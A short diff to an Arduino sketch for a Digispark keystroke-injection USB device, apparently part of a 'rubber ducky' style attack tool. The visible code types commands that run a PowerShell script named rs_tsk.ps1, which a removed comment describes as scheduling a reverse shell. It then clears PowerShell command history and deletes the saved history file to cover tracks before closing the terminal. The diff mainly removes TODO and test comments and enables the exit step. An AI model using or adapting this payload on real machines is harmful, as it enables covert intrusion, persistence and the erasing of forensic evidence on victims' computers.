@@ -41,12 +41,6 @@ void loop(){
   DigiKeyboard.print("C:\\rs_tsk.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-      
-  //TODO: Schedule task using to run reverse shell script
-  
-  //Testing
-  
-  
   //Delete all powershell command line history in current session and delete session.
   DigiKeyboard.print("[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -55,22 +49,8 @@ void loop(){
   DigiKeyboard.print("Remove-Item (Get-PSReadlineOption).HistorySavePath");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   //Exit Terminal
-  //DigiKeyboard.print("exit");
+  DigiKeyboard.print("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  
-
-
-  //Clear history in shell
-  //[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
-  //&&
-  //Clear-History
-  
-  
-  //DigiKeyboard.delay(600);
-  //DigiKeyboard.sendKeyStroke(KEY_LEFTARROW, KEY_ENTER);
-
-  //END:  Parsed by rubberDigi Script
-
   DigiKeyboard.delay(100);
   while(1){
   }
